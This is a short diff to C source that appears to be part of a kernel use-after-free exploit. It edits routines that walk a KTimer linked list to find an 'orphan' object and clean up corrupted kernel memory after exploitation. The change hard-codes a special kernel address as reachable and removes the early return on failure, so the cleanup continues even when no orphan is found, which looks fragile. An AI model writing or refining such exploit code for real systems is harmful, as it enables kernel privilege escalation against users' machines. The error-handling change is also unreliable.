@@ -48,6 +48,8 @@ static void *find_orphan() {
     if (IS_KERNEL_NON_SLAB_HEAP(child)) {
       /* object is allocated, therefore reachable */
       reachable[TOBJ_ADDR_TO_IDX(ktimer_base, current_timer)] = true;
+    } else if (child == (void *)TIMER2_NEXT_KERNEL) {
+      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, current_timer)] = true;
     } else if (ktimer_base <= child && child < ktimer_end) {
       /* object is freed, next pointer is reachable */
       reachable[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = true;
@@ -117,7 +119,6 @@ bool cleanup_uaf() {
   void *orphan = find_orphan();
   if (!orphan) {
     printf("[-] Failed to find orphan in KTimer linked list.\n");
-    return false;
   }
 
   printf("Found parent and orphan: %p -> %p\n", parent, orphan);
